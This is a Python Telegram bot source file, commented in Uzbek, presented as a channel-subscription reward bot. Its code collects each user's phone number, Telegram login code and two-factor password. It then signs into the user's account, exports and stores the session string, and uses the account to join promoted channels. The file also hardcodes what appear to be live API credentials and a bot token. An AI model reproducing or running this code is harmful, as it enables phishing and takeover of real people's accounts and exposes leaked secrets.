import asyncio
import sqlite3
import os
from pyrogram import Client
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import SessionPasswordNeeded

# Telegram hisob ma'lumotlari
API_ID = int(os.environ.get("API_ID", "34781111"))
API_HASH = os.environ.get("API_HASH", "f8d801388904eba3bbc892123698c928")
PHONE_NUMBER = os.environ.get("PHONE_NUMBER", "+8801842594487")
SESSION_NAME = "user_session"

# Bot tokeni
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8573440155:AAG2oHadY9thbvfRIYpIBMPcwhL9iw_hVL4")

# Global o'zgaruvchilar
user_client = None
auth_code_requests = {}  # {chat_id: phone_number}
password_requests = {}   # {chat_id: phone_number}
pending_sessions = {}    # {chat_id: {'phone': phone, 'code_hash': code_hash}}

# Bot client
bot_client = Client(
    "obuna_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# Database setup
conn = sqlite3.connect('obuna_bot.db', check_same_thread=False)
cursor = conn.cursor()

# Tables
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance INTEGER DEFAULT 0,
    total_tasks INTEGER DEFAULT 0,
    completed_tasks INTEGER DEFAULT 0
)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (
    phone_number TEXT PRIMARY KEY,
    session_string TEXT,
    is_active BOOLEAN DEFAULT 1
)''')
conn.commit()

async def start_user_client_with_bot_auth(phone_number, chat_id):
    """Bot orqali auth qilish"""
    global user_client
    
    try:
        # Avval saqlangan sessionni tekshirish
        cursor.execute("SELECT session_string FROM sessions WHERE phone_number = ? AND is_active = 1", (phone_number,))
        session_data = cursor.fetchone()
        
        if session_data:
            # Saqlangan session orqali ulanish
            session_string = session_data[0]
            user_client = Client(
                name=f"session_{phone_number}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_string
            )
            await user_client.start()
            print(f"Saqlangan session orqali ulandik: {phone_number}")
            return True
        
        # Yangi session yaratish
        user_client = Client(
            name=f"session_{phone_number}",
            api_id=API_ID,
            api_hash=API_HASH,
            phone_number=phone_number
        )
        
        # Auth kodini so'rash
        sent_code = await user_client.send_code(phone_number)
        code_hash = sent_code.phone_code_hash
        
        # Ma'lumotlarni saqlash
        pending_sessions[chat_id] = {
            'phone': phone_number,
            'code_hash': code_hash,
            'client': user_client
        }
        
        await bot_client.send_message(
            chat_id,
            f"📱 **Telefon raqam:** `{phone_number}`\n"
            f"📨 Telegram'dan kelgan **5 xonali kodni** yuboring:"
        )
        
        return False
        
    except Exception as e:
        print(f"Xatolik: {e}")
        await bot_client.send_message(chat_id, f"❌ Xatolik: {str(e)}")
        return False

async def handle_auth_code(chat_id, code):
    """Auth kodini tekshirish"""
    if chat_id not in pending_sessions:
        return False, "Session topilmadi. Qayta /start boshing."
    
    session_data = pending_sessions[chat_id]
    phone_number = session_data['phone']
    code_hash = session_data['code_hash']
    client = session_data['client']
    
    try:
        # Kodni tekshirish
        await client.sign_in(
            phone_number=phone_number,
            phone_code_hash=code_hash,
            phone_code=code
        )
        
        # Session string ni saqlash
        session_string = await client.export_session_string()
        cursor.execute('''INSERT OR REPLACE INTO sessions (phone_number, session_string) VALUES (?, ?)''',
                     (phone_number, session_string))
        conn.commit()
        
        # Tozalash
        del pending_sessions[chat_id]
        
        await bot_client.send_message(chat_id, "✅ Muvaffaqiyatli kirildi! Bot endi ishlaydi.")
        return True, "Success"
        
    except SessionPasswordNeeded:
        # 2FA paroli kerak
        password_requests[chat_id] = phone_number
        await bot_client.send_message(
            chat_id,
            "🔐 **2FA paroli kerak.**\n"
            "Telegram akkauntingizning 2 qadamli autentifikatsiya parolini yuboring:"
        )
        return False, "2FA required"
        
    except Exception as e:
        print(f"Auth xatosi: {e}")
        del pending_sessions[chat_id]
        return False, str(e)

async def handle_2fa_password(chat_id, password):
    """2FA parolini tekshirish"""
    if chat_id not in password_requests:
        return False, "2FA so'rovi topilmadi"
    
    phone_number = password_requests[chat_id]
    
    # Pending sessionni topish
    for pending_chat_id, data in pending_sessions.items():
        if data['phone'] == phone_number:
            client = data['client']
            try:
                await client.check_password(password)
                
                # Session string ni saqlash
                session_string = await client.export_session_string()
                cursor.execute('''INSERT OR REPLACE INTO sessions (phone_number, session_string) VALUES (?, ?)''',
                             (phone_number, session_string))
                conn.commit()
                
                # Tozalash
                del pending_sessions[pending_chat_id]
                del password_requests[chat_id]
                
                await bot_client.send_message(chat_id, "✅ 2FA paroli qabul qilindi! Bot endi ishlaydi.")
                return True, "Success"
                
            except Exception as e:
                del password_requests[chat_id]
                return False, str(e)
    
    return False, "Session topilmadi"

async def join_channel(channel_link):
    """Kanalga obuna bo'lish"""
    global user_client
    
    if user_client is None:
        return False, None
    
    try:
        # Get channel entity
        channel = await user_client.get_chat(channel_link)
        
        # Join channel
        await user_client.join_chat(channel_link)
        print(f"Obuna bo'lindi: {channel_link}")
        
        # Check if successfully joined
        member = await user_client.get_chat_member(channel.id, "me")
        if member.status in ["member", "administrator", "creator"]:
            return True, channel.id
        return False, None
        
    except Exception as e:
        print(f"Xatolik: {e}")
        return False, None

# Bot handlers
@bot_client.on_message()
async def handle_messages(client, message):
    chat_id = message.chat.id
    text = message.text or ""
    
    # Auth kodini qabul qilish
    if chat_id in pending_sessions and text.isdigit() and len(text) == 5:
        success, msg = await handle_auth_code(chat_id, text)
        if not success and msg == "2FA required":
            return  # 2FA parolini kutish
        elif not success:
            await message.reply(f"❌ Xatolik: {msg}")
        return
    
    # 2FA parolini qabul qilish
    elif chat_id in password_requests:
        success, msg = await handle_2fa_password(chat_id, text)
        if not success:
            await message.reply(f"❌ Xatolik: {msg}")
        return
    
    # Start command
    elif text.startswith('/start'):
        # Telefon raqamini so'rash
        auth_code_requests[chat_id] = True
        await message.reply(
            "👋 **X Obunachi Botiga xush kelibsiz!**\n\n"
            "Botni ishga tushirish uchun telefon raqamingizni yuboring:\n"
            "**Namuna:** `+998901234567`\n\n"
            "⚠️ **Diqqat:** Bu raqam kanallarga obuna bo'lish uchun ishlatiladi."
        )
        return
    
    # Telefon raqamini qabul qilish
    elif chat_id in auth_code_requests and text.replace('+', '').replace(' ', '').isdigit():
        phone_number = text.strip()
        del auth_code_requests[chat_id]
        
        await message.reply(f"📱 Telefon raqam qabul qilindi: `{phone_number}`\n"
                          f"Auth kodini so'rayapman...")
        
        success = await start_user_client_with_bot_auth(phone_number, chat_id)
        if not success:
            return  # Auth kodi so'ralgan
    
    # Asosiy menyu
    elif text.startswith('/menu'):
        user_id = message.from_user.id
        username = message.from_user.username or ""
        
        # Save user to database
        cursor.execute('''INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)''', 
                      (user_id, username))
        cursor.execute('''UPDATE users SET username = ? WHERE user_id = ?''', 
                      (username, user_id))
        conn.commit()
        
        # Get user stats
        cursor.execute('''SELECT balance, total_tasks, completed_tasks FROM users WHERE user_id = ?''', 
                      (user_id,))
        stats = cursor.fetchone()
        balance = stats[0] if stats else 0
        total_tasks = stats[1] if stats else 0
        completed_tasks = stats[2] if stats else 0
        
        # Create task for user
        task_id = 574027
        task_name = "Waka_stock"
        task_total = 25
        task_done = 19
        task_username = "@waka_stock_org"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📢 Kanalga o'tish", url="https://t.me/waka_stock_org")],
            [InlineKeyboardButton("😊 Obuna bolidim", callback_data="subscribe_confirm")]
        ])
        
        await message.reply(
            f"**X Obunachi [Bot]**\n"
            f"13 260 monthly users\n"
            f"\n---\n"
            f"**ID**\n"
            f"ID Raqami: {task_id}\n"
            f"**Nomi:** {task_name}\n"
            f"**Buyurtma soni:** {task_total}\n"
            f"**Bajarildi:** {task_done}\n"
            f"**Usernamesi:** {task_username}\n"
            f"\n---\n"
            f"Kanalga obuna bo'ling va 😊 Obuna bolidim\n"
            f"tugmasini bosing.\n"
            f"Kanalga obuna bo'lganingiz uchun 1 P beriladi\n"
            f"\n---\n"
            f"**Balans:** {balance} P\n"
            f"**Bajarilgan:** {completed_tasks}/{total_tasks}\n",
            reply_markup=keyboard
        )

@bot_client.on_callback_query()
async def handle_callbacks(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    if data == "subscribe_confirm":
        if user_client is None:
            await callback_query.answer("❌ Avval telefon raqam orqali kirishingiz kerak!", show_alert=True)
            return
        
        # Join channel using user account
        channel_link = "https://t.me/waka_stock_org"
        
        try:
            # Attempt to join channel
            success, channel_id = await join_channel(channel_link)
            
            if success:
                # Update user balance
                cursor.execute('''UPDATE users SET 
                                balance = balance + 1,
                                total_tasks = total_tasks + 1,
                                completed_tasks = completed_tasks + 1 
                                WHERE user_id = ?''', (user_id,))
                conn.commit()
                
                # Get updated stats
                cursor.execute('''SELECT balance, completed_tasks FROM users WHERE user_id = ?''', 
                             (user_id,))
                stats = cursor.fetchone()
                new_balance = stats[0] if stats else 1
                completed = stats[1] if stats else 1
                
                await callback_query.answer(
                    f"✅ Obuna bo'ldingiz! +1 P\n"
                    f"Yangı balans: {new_balance} P\n"
                    f"Bajarilgan: {completed} ta",
                    show_alert=True
                )
                
                # Create next task
                next_task_id = 574028
                next_task_name = "Next_Channel"
                next_task_total = 30
                next_task_done = completed + 1
                next_task_username = "@next_channel"
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("📢 Kanalga o'tish", url="https://t.me/next_channel")],
                    [InlineKeyboardButton("😊 Obuna bolidim", callback_data="subscribe_next")]
                ])
                
                await callback_query.message.edit_text(
                    f"**X Obunachi [Bot]**\n"
                    f"13 260 monthly users\n"
                    f"\n---\n"
                    f"**ID**\n"
                    f"ID Raqami: {next_task_id}\n"
                    f"**Nomi:** {next_task_name}\n"
                    f"**Buyurtma soni:** {next_task_total}\n"
                    f"**Bajarildi:** {next_task_done}\n"
                    f"**Usernamesi:** {next_task_username}\n"
                    f"\n---\n"
                    f"Kanalga obuna bo'ling va 😊 Obuna bolidim\n"
                    f"tugmasini bosing.\n"
                    f"Kanalga obuna bo'lganingiz uchun 1 P beriladi\n"
                    f"\n---\n"
                    f"**Balans:** {new_balance} P\n"
                    f"**Bajarilgan:** {completed}/{next_task_total}\n",
                    reply_markup=keyboard
                )
                
            else:
                await callback_query.answer(
                    "❌ Obuna bo'lishda xatolik. Qayta urinib ko'ring.",
                    show_alert=True
                )
                
        except Exception as e:
            await callback_query.answer(
                f"Xatolik: {str(e)}",
                show_alert=True
            )
    
    elif data == "subscribe_next":
        # Handle next subscription
        if user_client is None:
            await callback_query.answer("❌ Avval telefon raqam orqali kirishingiz kerak!", show_alert=True)
            return
        
        channel_link = "https://t.me/next_channel"
        success, _ = await join_channel(channel_link)
        
        if success:
            cursor.execute('''UPDATE users SET 
                            balance = balance + 1,
                            completed_tasks = completed_tasks + 1 
                            WHERE user_id = ?''', (user_id,))
            conn.commit()
            
            await callback_query.answer(
                "✅ Keyingi kanalga obuna bo'ldingiz! +1 P",
                show_alert=True
            )

async def main():
    # Start bot client
    print("Botni ishga tushiramiz...")
    await bot_client.start()
    
    print("Bot ishga tushdi. /start bosib telefon raqamingizni yuboring.")
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Create required directories
    if not os.path.exists("sessions"):
        os.makedirs("sessions")
    
    # Run the bot
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot to'xtatildi.")